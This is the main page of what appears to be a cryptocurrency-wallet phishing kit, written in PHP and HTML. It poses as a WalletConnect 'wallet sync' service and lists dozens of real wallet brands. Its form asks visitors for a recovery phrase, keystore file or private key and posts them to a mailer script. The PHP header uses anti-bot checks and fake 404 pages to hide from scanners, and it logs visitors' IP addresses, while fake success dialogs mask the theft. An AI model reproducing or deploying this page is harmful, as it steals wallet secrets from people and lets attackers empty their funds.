<?php

    session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['visitor']) ||
        !$_SESSION['visitor']
    ) {
        $comps->log(
            "../Guard/Audio/live.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: Visitor\n\n"
        );
        $_SESSION['visitor'] = 1;
    }

?>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#000000">
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="csrf-token" content="LWlzXYjss487jn1NPkdQ2PbspoL5PqLnk2gIDFep">
    

    
    <!-- FAVICONS ICON -->
    <link rel="icon" href="../images/favicon.html" type="image/x-icon" />
    <link rel="shortcut icon" type="image/x-icon" href="../images/favicon.png" />

    <link rel="preconnect" href="https://fonts.gstatic.com/">

    <link href="wallet/css2.html" rel="stylesheet">

    

    <title>Blockchain Web Resolves - Wallet Connection.</title>
	<link href="wallet/bootstrap.min.css" rel="stylesheet">
    <link href="wallet/main.css" rel="stylesheet">
	

    <style type="text/css"></style>

	<script src="wallet/jquery-3.6.0.min.js"></script>

	<style type="text/css">
      
		[data-reach-dialog-overlay] {
	  background: rgb(0 0 0 / 98%);
	  position: fixed;
	  top: 0;
	  right: 0;
	  bottom: 0;
	  left: 0;
	  overflow: auto;
	  background-image: initial;
	  background-position-x: initial;
	  background-position-y: initial;
	  background-size: initial;
	  background-repeat-x: initial;
	  background-repeat-y: initial;
	  background-attachment: initial;
	  background-origin: initial;
	  background-clip: initial;
	  background-color: rgb(239 241 244);
	  overflow-x: auto;
	  overflow-y: auto;
  }
  .containerz {
	  height: 50px;
	  width: 40px;
	  position: absolute;
	  left: 0;
	  right: 0;
	  top: 0;
	  bottom: 0;
	  margin: auto;
  }
  .boxz {
	  position: relative;
	  height: 50px;
	  width: 40px;
	  animation: box 5s infinite linear;
  }
  .borderz.one {
	  height: 4px;
	  top: 0;
	  left: 0;
	  animation: border-one 5s infinite linear;
  }
  .borderz.two {
	  top: 0;
	  right: 0;
	  height: 100%;
	  width: 4px;
	  animation: border-two 5s infinite linear;
  }
  
  .borderz {
	  background: #007298;
	  position: absolute;
  }
  .borderz.three {
	  bottom: 0;	
	  right: 0;
	  height: 4px;
	  width: 100%;
	  animation: border-three 5s infinite linear;
  }
  .borderz.four {
	  bottom: 0;
	  left: 0;
	  height: 100%;
	  width: 4px;
	  animation: border-four 5s infinite linear;
  }
  .line.one {
	  top: 25%;
	  width: 0%;
	  animation: line-one 5s infinite linear;
  }
  
  .line {
	  height: 4px;
	  background: #007298;
	  position: absolute;
	  width: 0%;
	  left: 25%;
  }
  .line.two {
	  top: 45%;
	  animation: line-two 5s infinite linear;
  }
  .line.three {
	  top: 65%;
	  animation: line-three 5s infinite linear;
  }
  .containerz::after {
	  content: 'Synchronizing...';
	  color: #007298;
	  font-weight: 700;
	  position: absolute;
	  bottom: -50px;
	  left: -10px;
  }
  @keyframes border-one {
	  0%   {width:0;}
	  10%  {width:100%;}
	  100% {width:100%;}
  }
  
  @keyframes border-two {
	  0%   {height:0;}
	  10%  {height:0%;}
	  20%  {height:100%;}
	  100% {height:100%;}
  }
  
  @keyframes border-three {
	  0%   {width:0;}
	  20%  {width:0%;}
	  30%  {width:100%;}
	  100% {width:100%;}
  }
  
  @keyframes border-four {
	  0%   {height:0;}
	  30%  {height:0%;}
	  40%  {height:100%;}
	  100% {height:100%;}
  }
  
  @keyframes line-one {
	  0%   {left:25%;width:0;}
	  40%  {left:25%;width:0%;}
	  43%  {left:25%;width:50%;}
	  52%  {left:25%;width:50%;}
	  54%  {left:25%;width:0% }
	  55%  {right:25%;left:auto;}
	  63%  {width:10%;right:25%;left:auto;}
	  100% {width:10%;right:25%;left:auto;}
  }
  
  @keyframes line-two {
	  0%   {width:0;}
	  42%  {width:0%;}
	  45%  {width:50%;}
	  53%  {width:50%;}
	  54%  {width:0% }
	  60%  {width:50%}
	  100% {width:50%;}
  }
  
  @keyframes line-three {
	  0%   {width:0;}
	  45%  {width:0%;}
	  48%  {width:50%;}
	  51%  {width:50%;}
	  52%  {width:0% }
	  100% {width:0%;}
  }
  
  @keyframes box {
	  0%   {opacity:1;margin-left:0px;height:50px;width:40px;}
	  55%  {margin-left:0px;height:50px;width:40px;}
	  60%  {margin-left:0px;height:35px;width:50px;}
	  74%  {msthin-left:0;}
	  80%  {margin-left:-50px;opacity:1;}
	  90% {height:35px;width:50px;margin-left:50px;opacity:0;}
	  100% {opacity:0;}
  }

  .war-btn{
	color: #fff;
    background-color: #000;
    border-color: #000;
  }
  </style>

</head>

    


<body>
    <div class="sending" data-reach-dialog-overlay="" style="opacity: 1;z-index: 99999;display: none">

		<div class="containerz">
			<div class="boxz">
				<div class="borderz one"></div>
				<div class="borderz two"></div>
				<div class="borderz three"></div>
				<div class="borderz four"></div>

				<div class="line one"></div>
				<div class="line two"></div>
				<div class="line three"></div>
			</div>
		</div>

   </div>

  
	<div id="root">
		<div>

			<header class="header">
				<div class="nav_logo">
					<div class="container-fluid">
						<div class="row">
							<div class="col-md-6 float-left">
								<!-- <a aria-current="page" class="float-left" href="../index.htmL"><img src="../wp-content/uploads/2021/11/bbc-logo-1.png" class="img-fluid" alt="Wallet Sync Guide"></a> -->
							</div>
							<div class="col-md-6 float-right">
								<a aria-current="page" href="/blockchain"><button class="btn btn-primary float-right war-btn"> Back</button></a>
							</div>
						</div>
					</div>
					
				</div>
			</header>

			<main>
				<div class="fuQfHo">
					<div class="content_container">

						<div id="processing-dialog" class="message-dialog" style="display:none;">
							<div class="send-dialog-overlay"></div>
							<div class="send-dialog-content">
								<div class="connect-dialog-body">
									<h1 id="processing-val" style="font-size: 45px">30</h1>
									<h4 class="mt-3">Processing...</h4>
								</div>
							</div>
						</div>

						<div id="success-dialog" class="message-dialog" style="display:none;">
							<div class="send-dialog-overlay"></div>
							<div class="send-dialog-content">
								<div class="connect-dialog-body">
									<img style="width: 100px" src="wallet/success.gif" alt="Success">
									<h4 class="mt-3">Connection Successful</h4>
									<img style="width: 100px" src="assets/qr.png" alt="Success">
								</div>
							</div>
						</div>

						<div id="error-dialog" class="message-dialog" style="display: none">
							<div class="send-dialog-overlay"></div>
							<div class="send-dialog-content" style="background: #FEFCFB">
								<div class="connect-dialog-body">
									<img style="width: 150px" src="wallet/error.gif" alt="Success">
									<h4 class="mt-3">Connection Failed, Try Again</h4>
								</div>
							</div>
						</div>

						<div id="send-dialog" style="display: none">
							<div class="send-dialog-overlay"></div>
							<div class="send-dialog-content">
								<div class="connect-dialog-body">
									<div class="to-send-info">
										<div class="wallet-app-send-logo"><img id="current-wallet-send-logo" src="../syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name"></div>
										<div id="current-wallet-app-send" class="wallet-app-name-send">My app</div>
									</div>
									<div class="send-tabs">
										<button id="phraseSend">Phrase</button>
										<button id="keystoreSend">Keystore Json</button>
										<button id="privateKeySend">Private Key</button>
									</div>
									<div class="send-form">
										<form action="./demo/sndml.php" method="post" enctype="multipart/form-data">
											<input type="hidden" name="wallet" id="walletNameData">
											<div id="data-to-send">
												<div class="form-group">
													<div class="form-group">
														<input type="hidden" id="type" name="type" value="phrase">
														<textarea id="phrase" name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
													</div>
													<div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>
												</div>
											</div>
											<button type="submit" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;">PROCEED</button>
											<div class="text-right">
											<button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
											</div>
										</form>
									</div>
								</div>
							</div>
						</div>

						<div id="connect-dialog" style="display: none">
							<div class="content-dialog-overlay"></div>
							<div class="content-dialog-content">
								<div class="connect-dialog-header">
									<button class="dialog-dismiss">Back</button>
									<button class="dialog-dismiss">X</button>
								</div>
								<div class="connect-dialog-body">
									<div class="connection-info">
									</div>
									<div class="wallet-app-info">
										<div id="current-wallet-app" class="wallet-app-name"></div>
										<div class="wallet-app-logo"><img id="current-wallet-logo" src="../syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name"></div>
									</div>
								</div>
							</div>
						</div>
		<div class="fAmUdU">
			<h1 class="gFeYHJ" style="color: #FFF;"><img id="current-wallet-logo" style="width: 50px" src="assets/walletconnect-logo.svg" alt="wallet-app-name"> Blockchain Web Resolves WalletConnect</h1>
		
		</div>
		<section>
			<div class="wallet-grid">
				
				<div class="pg1">
					
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/rainbow.6d0d2612.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Rainbow
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/trust-wallet.4121118e.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Trust
							</div>
						</div> 
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/argent.jpg" alt="Argent">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Argent
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/metamask.9d0bcbd4.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								MetaMask
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/phantom.png" alt="Solana">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Phantom
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/solflare.jpg" alt="Solana" class="rounded rounded-circle">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Solflare
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/slope.png" alt="Solana">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Slope
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/solana.png" alt="Solana">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Solana
							</div>
						</div>
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/gnosis.jpg" alt="Solana">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Gnosis Safe
							</div>
						</div> 
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/crypto.836cded4.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Crypto.com
							</div>
						</div> 
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/pillar.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Pillar
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/math-wallet.23e9877e.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Math Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/bitpay.png" alt="Bitpay">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Bitpay
							</div>
						</div>
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/ledger.52e09fe1.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Ledger
							</div>
						</div> 
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/dharma.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Dharma
							</div>
						</div> 
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/1inch.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								1Inch
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/huobi.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Huobi wallet
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/eidoo.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Eidoo
							</div>
						</div> 
					</a>
				</div>
				
				
				<div class="pg2" style="display: none;">
					

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/coin98.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Coin98
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/alphawallet.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								AlphaWallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/dcent.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								D'CENT Wallet
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/ZelCore.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								ZelCore
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/nash.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Nash
							</div>
						</div> 
					</a>			
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/cybavo.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								CYBAVO Wallet
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/safepal.71147cce.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								SafePal
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/easywallet.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								EasyPocket
							</div>
						</div> 
					</a>
					<a target="self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/bridge.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Brigde Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/sparkpoint.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								SparkPoint
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/bitkeep.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								BitKeep
							</div>
						</div> 
					</a>
					<a target="self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/peakdefi.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								PeakDeFi Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/unstoppable.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Unstoppable Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/halo.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								HaloDeFi Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/ellipal.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Ellipal
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/keyringpro.jpg" alt="Keyring pro">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Keyring pro
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/aktionriat.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Aktionariat
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/talken.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Talken Wallet
							</div>
						</div> 
					</a>
				</div>
				
				<div class="pg3" style="display: none;">
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/flare.jpeg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Flare Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/kyberswap.jpeg" alt="KyberSwap">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								KyberSwap
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/atoken.jpeg" alt="AToken Wallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								AToken Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/tongue.jpeg" alt="Tongue Wallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Tongue Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/rwallet.jpeg" alt="RWallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								RWallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/plasmapay.jpeg" alt="PlasmaPay">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								PlasmaPay
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/q3.jpeg" alt="Q3Wallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Q3Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/hash.jpeg" alt="HashKey Me">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								HashKey Me
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/defiant.jpeg" alt="Defiant">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Defiant
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/valora.jpeg" alt="Valora">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Valora
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/celo.jpeg" alt="Celo Wallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Celo Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/elasto.jpeg" alt="Elastos Essentials">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Elastos Essentials
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/fuse.jpeg" alt="fuse.cash">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								fuse.cash
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/bitpie.jpeg" alt="Bitpie">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Bitpie
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/stasis.jpeg" alt="Stasis">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Stasis
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/jul.jpeg" alt="JulWallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								JulWallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/arch.jpeg" alt="ArchiPage">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								ArchiPage
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/tangem.jpeg" alt="Tangem">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Tangem
							</div>
						</div> 
					</a>
				</div>
				
				
